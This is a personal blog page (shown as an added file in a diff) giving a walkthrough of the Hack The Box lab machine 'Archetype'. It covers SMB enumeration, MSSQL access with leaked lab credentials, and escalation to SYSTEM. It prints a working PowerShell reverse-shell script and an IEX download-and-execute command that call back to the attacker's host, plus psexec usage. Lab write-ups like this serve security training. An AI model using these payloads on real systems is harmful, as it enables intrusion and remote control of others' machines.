@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en" dir=>
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This was a good box to get back in the swing of things, it gave me a good challenge, and reminded me of how difficult it can be to google for Windows enum tools. Besides that, it was a good reminder of how to interact with SMB and showed me a new place to look for user command history in Windows.">
+<meta name="theme-color" content="#FFFFFF"><meta property="og:title" content="Archetype" />
+<meta property="og:description" content="This was a good box to get back in the swing of things, it gave me a good challenge, and reminded me of how difficult it can be to google for Windows enum tools. Besides that, it was a good reminder of how to interact with SMB and showed me a new place to look for user command history in Windows." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://stefantobler.com/posts/hack-the-box/archetype/" />
+<meta property="article:published_time" content="2021-03-15T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-03-15T00:00:00+00:00" />
+<title>Archetype | Stefan Tobler</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.6cd8553a6854f4812343f0f0c8baca31271e686434f381fbe3c7226f66639176.css" integrity="sha256-bNhVOmhU9IEjQ/DwyLrKMSceaGQ084H748cib2ZjkXY=">
+<script defer src="/en.search.min.24f8f40c2756168e54d3c52c27896d20a0bdf40f75067c6dc1577730a766787f.js" integrity="sha256-JPj0DCdWFo5U08UsJ4ltIKC99A91BnxtwVd3MKdmeH8="></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-158607018-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+  
+<link rel="stylesheet" href="/assets/css/posts.css" />
+
+</head>
+
+<body dir=>
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      
+  <nav>
+<h2 class="book-brand">
+  <a href="/"><img src="/images/logo.png" alt="Logo" /><span>Stefan Tobler</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+<span><a href='https://stefantobler.com/posts/'>Recent Posts</a></span>
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="https://stefantobler.com/categories/hack-the-box">Hack the Box</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="https://stefantobler.com/categories/challenges">Challenges</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/challenges/fuzzy/" class="">Fuzzy</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/archetype/" class="active">Archetype</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/magic/" class="">Magic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/remote/" class="">Remote</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/traceback/" class="">Traceback</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/admirer/" class="">Admirer</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="https://stefantobler.com/categories/try-hack-me">Try Hack Me</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/basic-pentesting/" class="">Basic Pentesting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/blue/" class="">Blue</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/ice/" class="">Ice</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/vulnversity/" class="">Vulnversity</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/shodan.io/" class="">Shodan.io</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="https://stefantobler.com/categories/capture-the-flag">Capture the Flag</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/posts/ctf/nahamcon_2021/" class="">Nahamcon 2021 CTF</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="https://stefantobler.com/categories/misc">Misc</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/posts/misc/docker-containerization-vs-virtualization/" class="">Docker - Containerization vs. Virtualization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/misc/virtualbox-tutorial/" class="">How to Install Kali Linux on VirtualBox</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script>
+
+
+ 
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Archetype</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav>
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+
+<div class="post-hero-container">
+  <img class="card-img-top" src='/images/content/posts/hack-the-box/archetype.png'/>
+</div>
+
+<article class="markdown">
+  <h1>
+    <a href="/posts/hack-the-box/archetype/">Archetype</a>
+  </h1>
+  
+  
+  <div>
+    
+      <a href="/categories/hack-the-box/">hack-the-box</a>
+  </div>
+  
+
+  
+  <div>
+    
+      <a href="/tags/windows/">windows</a>, 
+      <a href="/tags/powershell/">powershell</a>, 
+      <a href="/tags/mssql/">mssql</a>
+  </div>
+  
+
+
+  <p><p>This was a good box to get back in the swing of things, it gave me a good challenge, and reminded me of how difficult it can be to google for Windows enum tools. Besides that, it was a good reminder of how to interact with SMB and showed me a new place to look for user command history in Windows.</p>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>nmap</li>
+<li>netcat</li>
+<li>mssqlclient</li>
+</ul>
+<h2 id="recon">
+  Recon
+  <a class="anchor" href="#recon">#</a>
+</h2>
+<p>First, we need to check the open ports on this machine. We can use <code>nmap</code> to do check for these. I use the command <code>nmap -sV -sS -p- archetype.htb -oA nmap/archetype</code>, and we got quite a few ports open!</p>
+<pre><code># Nmap 7.91 scan initiated Mon Mar 15 15:22:53 2021 as: nmap -sV -sS -p- archetype.htb -oA nmap/archetype
+Nmap scan report for archetype.htb (10.10.10.27)
+Host is up (0.035s latency).
+Not shown: 65523 closed ports
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Mar 15 15:25:30 2021 -- 1 IP address (1 host up) scanned in 156.36 seconds
+</code></pre><p>We have quite a few consecutive ports open in the range <code>49664-49669</code>. There is also a server open on port 445 and what looks like some API endpoints open on <code>5985</code> and <code>47001</code>. For now let&rsquo;s check to see if there is anything we can see through anonymous login via <code>smb</code>. What is <code>smb</code>? Well, <code>smb</code> or Server Message Block is used for remote communication and enables users to view, share, and edit files. This means that if for some reason anonymous login is allowed, we might be able to see some files, if we are lucky maybe even sensitive ones.</p>
+<h2 id="foothold">
+  Foothold
+  <a class="anchor" href="#foothold">#</a>
+</h2>
+<p>To check out if <code>smb</code> allows for anonymous access I am going to use the <code>smbclient</code>, here it is <code>smbclient -N -L \\archetype.htb\</code>. Let&rsquo;s break it down, <code>-N</code> means no-password, this will not ask us for a password, next we have <code>-L</code>, this gets the list of shares there are available on the host. Now let&rsquo;s run it.</p>
+<pre><code>Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backups         Disk
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+</code></pre><p>Looks like this machine has four shares, but the shares <code>ADMIN$</code>, <code>C$</code>, and <code>IPC$</code> are all default shares. The one we are interested in is <code>backups</code>. To examine this share use the command <code>smbclient -N \\archetype.htb\backups</code>, notice that now we are not listing the shares and we specified the share at the end of the path. Once we are connected use the <code>ls</code> command to list the files in the share. Interestingly enough there is a file called <code>prod.dstConfig</code>, config files are good they can tell us how the machines were set up, and sometimes can leak credentials ;).</p>
+<pre><code>smb: \&gt; ls
+  .                                   D        0  Mon Jan 20 07:20:57 2020
+  ..                                  D        0  Mon Jan 20 07:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
+
+		10328063 blocks of size 4096. 8257544 blocks available
+smb: \&gt; get prod.dtsConfig
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
+smb: \&gt; exit
+</code></pre><p>Now that we have the file let&rsquo;s take a look at what is inside.</p>
+<pre><code>&lt;DTSConfiguration&gt;
+    &lt;DTSConfigurationHeading&gt;
+        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;
+    &lt;/DTSConfigurationHeading&gt;
+    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;
+        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
+    &lt;/Configuration&gt;
+&lt;/DTSConfiguration&gt;
+</code></pre><p>Would ya look at that, there are some account credentials for what looks like the <code>sql</code> server running on port <code>1433</code>. We can connect to the <code>sql</code> server using the client included with <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>. I cloned this repo into a directory called <code>gitclones</code> in my home directory. The command I used to connect is:</p>
+<pre><code>python ~/gitclones/impacket/examples/mssqlclient.py -port 1433 ARCHETYPE/sql_svc:M3g4c0rp123@archetype.htb -windows-auth
+</code></pre><p>This specifies the port as <code>1433</code>, although I believe this is the default port, and then includes the domain, username, password, and ip. Finally the <code>-windows-auth</code> flag specifies that we want to use windows authentication.</p>
+<h2 id="user">
+  User
+  <a class="anchor" href="#user">#</a>
+</h2>
+<p>If we run the command <code>help</code> it will tell us some commands we have at our disposal.</p>
+<pre><code>SQL&gt; help
+
+     lcd {path}                 - changes the current local directory to {path}
+     exit                       - terminates the server process (and this session)
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+     ! {cmd}                    - executes a local shell cmd
+</code></pre><p>Well look at that, the command <code>xp_cmdshell</code> might let us execute code on the machine if we have the correct permissions. Let&rsquo;s enable it and see if we do.</p>
+<pre><code>SQL&gt; enable_xp_cmdshell
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL&gt; xp_cmdshell powershell whoami
+output
+
+--------------------------------------------------------------------------------
+
+archetype\sql_svc
+
+NULL
+
+SQL&gt;
+</code></pre><p>Well we can execute commands, let&rsquo;s try and get a reverse shell up and running. copy the following code into a file called <code>rv.ps1</code>. Replace the IP address with yours connected to HTB and the port can be anything you like.</p>
+<pre><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.202&quot;,1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback+&quot;# &quot;;$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></pre><p>Then start a simple http server in the same directory using <code>python -m http.server</code>, this will host an http server on port 8000. Finally, start listening on for the reverse shell using the command <code>nc -lvnp [PORT]</code>. Then spawn it.</p>
+<p><code>xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.14.202:8000/rv.ps1\&quot;);&quot;</code></p>
+<p>You should catch the shell on the terminal listening with netcat. From the shell we can navigate to the <code>user.txt</code> file. It is going to be in the <code>C:\Users\sql_svc\Desktop</code> directory.</p>
+<h2 id="root">
+  Root
+  <a class="anchor" href="#root">#</a>
+</h2>
+<p>Now let&rsquo;s check out the powershell history in <code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code>. Once we see that we get the following.</p>
+<p><code>net.exe use T: \Archetypeackups /user:administrator MEGACORP_4dm1n!!</code></p>
+<p>Looks like credentials to the administrators account! To access the account we can use <code>psexec.py</code> from Impacket&rsquo;s tools. Here is the command I used <code>python ~/gitclones/impacket/examples/psexec.py administrator@archetype.htb</code>. Once we authenticate:</p>
+<pre><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on archetype.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file CrWnXMou.exe
+[*] Opening SVCManager on archetype.htb.....
+[*] Creating service INdq on archetype.htb.....
+[*] Starting service INdq.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre><p>Again the <code>root.txt</code> file is on the Administrator&rsquo;s desktop.</p>
+</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "stefantobler" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav>
+
+ 
+    </aside>
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
